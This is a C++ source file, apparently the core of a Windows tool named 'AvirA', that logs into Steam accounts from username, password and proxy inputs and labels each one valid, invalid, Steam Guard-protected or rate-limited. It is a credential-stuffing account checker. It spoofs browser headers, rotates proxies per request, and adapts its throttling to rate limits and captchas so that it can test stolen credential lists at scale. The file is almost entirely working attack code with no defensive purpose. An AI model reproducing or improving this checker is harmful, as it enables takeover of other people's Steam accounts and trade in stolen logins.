#include "steamcheck.h"
#include "rsa.h"
#include "jsonmini.h"
#include "util.h"
#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <atomic>
#include <mutex>
#include <chrono>
#include <thread>
#include <random>
#include <map>

#pragma comment(lib, "winhttp.lib")

static std::wstring ToWide(const std::string& s) {
    if (s.empty()) return L"";
    int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, nullptr, 0);
    std::wstring w(n, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, w.data(), n);
    w.resize(n ? n - 1 : 0);
    return w;
}

static std::atomic<long long> g_nextAllowed{0};
static std::atomic<long long> g_lastReq{0};
static std::atomic<int> g_minInterval{250};
static std::atomic<int> g_consecOk{0};

namespace steamcheck {
int CurrentMinInterval() { return g_minInterval.load(); }
void ReportMinInterval(int ms) { g_minInterval.store(ms < 100 ? 100 : ms); }
}

static void GlobalThrottle() {
    long long until = g_nextAllowed.load();
    long long now = util::NowMs();
    if (until > now)
        std::this_thread::sleep_for(std::chrono::milliseconds((int)(until - now)));
    long long last = g_lastReq.load();
    now = util::NowMs();
    int iv = g_minInterval.load();
    if (last != 0 && now - last < iv) {
        std::this_thread::sleep_for(std::chrono::milliseconds((int)(iv - (now - last))));
    }
    g_lastReq.store(util::NowMs());
}

static void OnRateLimit(int waitMs) {
    g_nextAllowed.store(util::NowMs() + waitMs);
    int cur = g_minInterval.load();
    g_minInterval.store(cur + 350 > 5000 ? 5000 : cur + 350);
    g_consecOk.store(0);
}

static void OnSuccess() {
    int ok = g_consecOk.fetch_add(1) + 1;
    if (ok >= 6) {
        int cur = g_minInterval.load();
        if (cur > 250) g_minInterval.store(cur - 100);
        g_consecOk.store(2);
    }
}

struct RawResp {
    bool ok = false;
    int status = 0;
    std::string body;
    int retryAfterMs = 0;
    std::string setCookie;
};

static std::string ExtractCookies(HINTERNET hReq) {
    DWORD sz = 0;
    WinHttpQueryHeaders(hReq, WINHTTP_QUERY_RAW_HEADERS_CRLF,
                        WINHTTP_HEADER_NAME_BY_INDEX, NULL, &sz,
                        WINHTTP_NO_HEADER_INDEX);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER || sz == 0) return "";
    std::vector<wchar_t> buf(sz / sizeof(wchar_t) + 4);
    if (!WinHttpQueryHeaders(hReq, WINHTTP_QUERY_RAW_HEADERS_CRLF,
                             WINHTTP_HEADER_NAME_BY_INDEX, buf.data(), &sz,
                             WINHTTP_NO_HEADER_INDEX)) return "";
    std::wstring raw(buf.data());
    std::string cookies;
    const wchar_t* p = raw.c_str();
    while (p && *p) {
        const wchar_t* e = wcsstr(p, L"\r\n");
        if (!e) e = p + wcslen(p);
        std::wstring line(p, e - p);
        if (line.size() >= 11) {
            std::wstring low = line;
            for (auto& c : low) c = towlower(c);
            if (low.rfind(L"set-cookie:", 0) == 0) {
                size_t colon = line.find(L':');
                if (colon != std::wstring::npos) {
                    std::wstring val = line.substr(colon + 1);
                    size_t a = 0;
                    while (a < val.size() && (val[a] == L' ' || val[a] == L'\t')) a++;
                    size_t semi = val.find(L';', a);
                    if (semi != std::wstring::npos) val = val.substr(a, semi - a);
                    else val = val.substr(a);
                    while (!val.empty() && (val.back() == L' ' || val.back() == L'\t')) val.pop_back();
                    if (!val.empty()) {
                        int n = WideCharToMultiByte(CP_UTF8, 0, val.c_str(), -1,
                                                    nullptr, 0, nullptr, nullptr);
                        std::string av(n, 0);
                        WideCharToMultiByte(CP_UTF8, 0, val.c_str(), -1, av.data(), n,
                                            nullptr, nullptr);
                        if (!av.empty() && av.back() == '\0') av.pop_back();
                        if (!cookies.empty()) cookies += "; ";
                        cookies += av;
                    }
                }
            }
        }
        if (!*e) break;
        p = e + 2;
        if (!*p) break;
    }
    return cookies;
}

class HttpSession {
public:
    ~HttpSession() { Close(); }

    bool Ensure(const std::string& proxy) {
        if (m_alive && m_proxy == proxy) return true;
        Close();
        if (proxy.empty()) {
            m_h = WinHttpOpen(L"AvirA/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
            if (!m_h)
                m_h = WinHttpOpen(L"AvirA/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                  WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        } else {
            std::wstring pw = ToWide(proxy);
            m_h = WinHttpOpen(L"AvirA/1.0", WINHTTP_ACCESS_TYPE_NAMED_PROXY,
                              pw.c_str(), WINHTTP_NO_PROXY_BYPASS, 0);
        }
        if (!m_h) return false;
        WinHttpSetTimeouts(m_h, 12000, 12000, 12000, 12000);
        m_alive = true;
        m_proxy = proxy;
        return true;
    }

    void Close() {
        if (m_h) { WinHttpCloseHandle(m_h); m_h = nullptr; }
        m_alive = false;
    }

    RawResp Post(const std::string& host, const std::string& path,
                 const std::string& body, const std::string& cookie) {
        RawResp r;
        if (!m_h) return r;
        HINTERNET hConn = WinHttpConnect(m_h, ToWide(host).c_str(),
                                         INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (!hConn) return r;
        HINTERNET hReq = WinHttpOpenRequest(hConn, L"POST", ToWide(path).c_str(),
                                            nullptr, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            WINHTTP_FLAG_SECURE);
        if (!hReq) { WinHttpCloseHandle(hConn); return r; }

        std::wstring hdr = L"Content-Type: application/x-www-form-urlencoded\r\n";
        hdr += L"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\r\n";
        hdr += L"Accept: application/json, text/javascript, */*; q=0.01\r\n";
        hdr += L"Accept-Language: en-US,en;q=0.9\r\n";
        hdr += L"Origin: https://steamcommunity.com\r\n";
        hdr += L"Referer: https://steamcommunity.com/login/home/?goto=\r\n";
        hdr += L"X-Requested-With: XMLHttpRequest\r\n";
        if (!cookie.empty()) hdr += L"Cookie: " + ToWide(cookie) + L"\r\n";

        BOOL sent = WinHttpSendRequest(hReq, hdr.c_str(), (DWORD)-1,
                                       (LPVOID)body.data(), (DWORD)body.size(),
                                       (DWORD)body.size(), 0);
        if (sent && WinHttpReceiveResponse(hReq, nullptr)) {
            DWORD st = 0, sz = sizeof(st);
            WinHttpQueryHeaders(hReq, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                                WINHTTP_HEADER_NAME_BY_INDEX, &st, &sz,
                                WINHTTP_NO_HEADER_INDEX);
            r.status = (int)st;
            r.retryAfterMs = ExtractRetryAfter(hReq);
            r.setCookie = ExtractCookies(hReq);
            DWORD avail = 0;
            do {
                avail = 0;
                if (!WinHttpQueryDataAvailable(hReq, &avail)) break;
                if (!avail) break;
                std::string chunk(avail, 0);
                DWORD rd = 0;
                if (!WinHttpReadData(hReq, chunk.data(), avail, &rd)) break;
                chunk.resize(rd);
                r.body += chunk;
            } while (avail > 0);
            r.ok = st >= 200 && st < 300;
        }
        WinHttpCloseHandle(hReq);
        WinHttpCloseHandle(hConn);
        return r;
    }

private:
    static int ExtractRetryAfter(HINTERNET hReq) {
        DWORD sz = 0;
        WinHttpQueryHeaders(hReq, WINHTTP_QUERY_RAW_HEADERS_CRLF,
                            WINHTTP_HEADER_NAME_BY_INDEX, NULL, &sz,
                            WINHTTP_NO_HEADER_INDEX);
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER || sz == 0) return 0;
        std::vector<wchar_t> buf(sz / sizeof(wchar_t) + 4);
        if (!WinHttpQueryHeaders(hReq, WINHTTP_QUERY_RAW_HEADERS_CRLF,
                                 WINHTTP_HEADER_NAME_BY_INDEX, buf.data(), &sz,
                                 WINHTTP_NO_HEADER_INDEX)) return 0;
        std::wstring low(buf.data());
        for (auto& c : low) c = towlower(c);
        const wchar_t* p = wcsstr(low.c_str(), L"retry-after:");
        if (!p) return 0;
        p += 12;
        while (*p == L' ' || *p == L'\t') p++;
        wchar_t* end = nullptr;
        long v = wcstol(p, &end, 10);
        if (v > 0 && v < 300) return (int)(v * 1000);
        return 0;
    }

    HINTERNET m_h = nullptr;
    bool m_alive = false;
    std::string m_proxy;
};

static thread_local HttpSession tls_session;

static std::string MergeCookies(const std::string& oldC, const std::string& newC) {
    if (oldC.empty()) return newC;
    if (newC.empty()) return oldC;
    std::map<std::string, std::string> jar;
    auto add = [&jar](const std::string& c) {
        if (c.empty()) return;
        std::string rest = c;
        size_t pos = 0;
        while (pos < rest.size()) {
            size_t semi = rest.find(';', pos);
            std::string pair = semi == std::string::npos ? rest.substr(pos) : rest.substr(pos, semi - pos);
            size_t a = 0;
            while (a < pair.size() && (pair[a] == ' ' || pair[a] == '\t')) a++;
            size_t eq = pair.find('=', a);
            if (eq != std::string::npos) {
                std::string k = pair.substr(a, eq - a);
                std::string v = pair.substr(eq + 1);
                jar[k] = v;
            }
            if (semi == std::string::npos) break;
            pos = semi + 1;
        }
    };
    add(oldC);
    add(newC);
    std::string out;
    for (auto& kv : jar) {
        if (!out.empty()) out += "; ";
        out += kv.first + "=" + kv.second;
    }
    return out;
}

CheckOutcome CheckSteamAccount(const std::string& user, const std::string& pass,
                               const std::string& proxy) {
    if (!tls_session.Ensure(proxy)) return {AccStatus::Error, "no session"};

    GlobalThrottle();

    thread_local std::string tls_cookieJar;
    std::string cookie = tls_cookieJar;

    long long ts = util::NowMs();
    std::string b1 = "username=" + util::UrlEncode(user) +
                     "&donotcache=" + std::to_string(ts);

    RawResp r1 = tls_session.Post("steamcommunity.com", "/login/getrsakey/", b1, cookie);
    if (!r1.setCookie.empty())
        tls_cookieJar = MergeCookies(tls_cookieJar, r1.setCookie);
    if (r1.status == 429) {
        OnRateLimit(r1.retryAfterMs ? r1.retryAfterMs : 4500);
        return {AccStatus::RateLimited, "rate 429"};
    }
    if (!r1.ok || r1.body.empty()) { tls_session.Close(); return {AccStatus::Error, "network"}; }
    if (!jsonmini::GetBool(r1.body, "success")) {
        std::string m = jsonmini::GetString(r1.body, "message");
        std::string ml = util::ToLower(m);
        if (ml.find("rate") != std::string::npos || ml.find("too many") != std::string::npos) {
            OnRateLimit(3500);
            return {AccStatus::RateLimited, m};
        }
        return {AccStatus::Error, m.empty() ? "no rsakey" : m};
    }
    std::string mod = jsonmini::GetString(r1.body, "publickey_mod");
    std::string exp = jsonmini::GetString(r1.body, "publickey_exp");
    std::string stamp = jsonmini::GetString(r1.body, "timestamp");
    if (mod.empty() || exp.empty()) return {AccStatus::Error, "bad key"};
    std::string enc = RsaEncryptPassword(mod, exp, pass);
    if (enc.empty()) return {AccStatus::Error, "crypto"};

    std::this_thread::sleep_for(std::chrono::milliseconds(140));

    std::string b2 = "username=" + util::UrlEncode(user) +
                     "&password=" + util::UrlEncode(enc) +
                     "&emailauth=&loginfriendlyname=&captchagid=-1&captcha_text=&emailsteamid=" +
                     "&rsatimestamp=" + stamp +
                     "&remember_login=true&donotcache=" + std::to_string(util::NowMs());

    RawResp r2 = tls_session.Post("steamcommunity.com", "/login/dologin/", b2, cookie);

    if (r2.status == 429) {
        OnRateLimit(r2.retryAfterMs ? r2.retryAfterMs : 4500);
        return {AccStatus::RateLimited, "rate 429"};
    }
    if (!r2.ok && r2.body.empty()) { tls_session.Close(); return {AccStatus::Error, "network"}; }

    if (jsonmini::GetBool(r2.body, "success")) {
        OnSuccess();
        return {AccStatus::Valid, ""};
    }
    if (jsonmini::GetBool(r2.body, "emailauth_needed") ||
        jsonmini::GetBool(r2.body, "requires_twofactor"))
        return {AccStatus::Guard, "steamguard"};

    std::string msg = jsonmini::GetString(r2.body, "message");
    std::string low = util::ToLower(msg);

    if (jsonmini::GetBool(r2.body, "captcha_needed")) {
        OnRateLimit(3500);
        return {AccStatus::RateLimited, "captcha"};
    }
    if (low.find("rate") != std::string::npos ||
        low.find("too many") != std::string::npos ||
        low.find("try again") != std::string::npos ||
        low.find("temporarily") != std::string::npos) {
        OnRateLimit(3500);
        return {AccStatus::RateLimited, msg};
    }
    if (msg.empty()) {
        if (r2.body.find("incorrect") != std::string::npos)
            return {AccStatus::Invalid, "incorrect"};
        tls_session.Close();
        return {AccStatus::Error, "empty"};
    }
    return {AccStatus::Invalid, msg};
}
